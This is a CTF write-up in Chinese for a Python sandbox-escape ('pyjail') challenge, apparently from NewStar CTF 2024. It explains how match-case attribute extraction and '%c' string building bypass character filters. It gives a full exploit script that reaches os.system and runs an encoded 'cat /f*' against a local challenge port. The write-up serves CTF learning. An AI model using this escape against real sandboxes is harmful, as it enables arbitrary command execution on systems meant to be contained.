# pyjail

> 分类：Misc

## 题目描述
Python 沙箱逃逸题，利用 Python 3.10 的 `match case` 语法获取对象属性，配合 `str.join` 和 `%` 格式化构造字符串（绕过字符限制），最终通过 `vars()`、`__builtins__`、`__import__` 调用 `os.system` 执行命令。

## 考察知识点
- Python `match case` 语法获取对象属性
- 字符串构造（`str.join` + `%c` 格式化绕过禁用字符）
- `vars()` / `__builtins__` / `__import__` 沙箱逃逸

## 解法
`match case`（Python 3.10）可用来获取对象的属性。`str()` 是空字符串对象，`match str(): case str(join=join):` 得到 `join` 方法，`join(list((chr(37),chr(99),)))` 得到 `bfc = "%c"`，再用 `%` 构造任意字符串。

EXP：
```python
import socket,time
code = \
'''
bfc = None
buil = None
impo = None
os = None
system = None
cmd = None
match str():
    case str(join=join):
        bfc = join(list((chr(37),chr(99),)))
        buil = bfc*12
        buil = buil%(95,95,98,117,105,108,116,105,110,115,95,95)
        impo = bfc*10
        impo = impo%(95,95,105,109,112,111,114,116,95,95)
        system = bfc*6
        system = system%(115,121,115,116,101,109)
        os = bfc*2
        os = os%(111,115)
        cmd = bfc*7
        cmd = cmd%(99,97,116,32,47,102,42)

match vars():
    case dict(get=get):
        bui = vars(get(buil))
        match bui:
            case dict(get=get2):
                os = vars(get2(impo)(os))
                match os:
                    case dict(get=get3):
                        get3(system)(cmd)

EOF
'''

def send_messages(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"正在连接到 {host}:{port}")
        sock.connect((host, port))
        messages = [
            "start",
            code,
        ]
        for message in messages:
            sock.sendall(message.encode())
            time.sleep(2)
        response = sock.recv(1024)
        print(f"收到回应: {response.decode()}")
    except Exception as e:
        print(f"发生错误: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    target_host = "127.0.0.1"
    target_port = 32808
    send_messages(target_host, target_port)
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/misc/pyjail.html
